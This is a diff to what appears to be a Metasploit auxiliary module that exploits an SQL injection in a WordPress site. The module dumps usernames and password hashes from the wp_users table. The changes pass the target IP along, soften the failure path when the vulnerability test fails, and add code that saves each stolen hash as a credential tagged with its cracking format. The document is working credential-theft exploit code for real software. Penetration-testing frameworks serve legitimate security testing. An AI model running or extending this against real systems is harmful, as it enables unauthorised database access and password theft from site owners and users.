@@ -7,6 +7,7 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HTTP::Wordpress
   include Msf::Auxiliary::Scanner
   include Msf::Exploit::SQLi
+  require 'metasploit/framework/hashes/identify'
 
   def initialize(info = {})
     super(
@@ -44,7 +45,7 @@ class MetasploitModule < Msf::Auxiliary
     ]
   end
 
-  def run_host(_ip)
+  def run_host(ip)
     unless wordpress_and_online?
       vprint_error('Server not online or not detected as wordpress')
       return
@@ -81,13 +82,28 @@ class MetasploitModule < Msf::Auxiliary
       fail_with Failure::Unreachable, 'Connection failed' unless res
     end
     unless @sqli.test_vulnerable
-      fail_with(Failure::Unknown, "#{peer} - Testing of SQLi failed.  If this is time based, try increasing SqliDelay.")
+      print_bad("#{peer} - Testing of SQLi failed.  If this is time based, try increasing SqliDelay.")
+      return
     end
 
     columns = ['user_login', 'user_pass']
     results = @sqli.dump_table_fields('wp_users', columns, '', datastore['COUNT'])
     table = Rex::Text::Table.new('Header' => 'wp_users', 'Indent' => 1, 'Columns' => columns)
     results.each do |user|
+      create_credential({
+        workspace_id: myworkspace_id,
+        origin_type: :service,
+        module_fullname: fullname,
+        username: user[0],
+        private_type: :nonreplayable_hash,
+        jtr_format: identify_hash(user[1]),
+        private_data: user[1],
+        service_name: 'Wordpress',
+        address: ip,
+        port: datastore['RPORT'],
+        protocol: 'tcp',
+        status: Metasploit::Model::Login::Status::UNTRIED
+      })
       table << user
     end
     print_good(table.to_s)
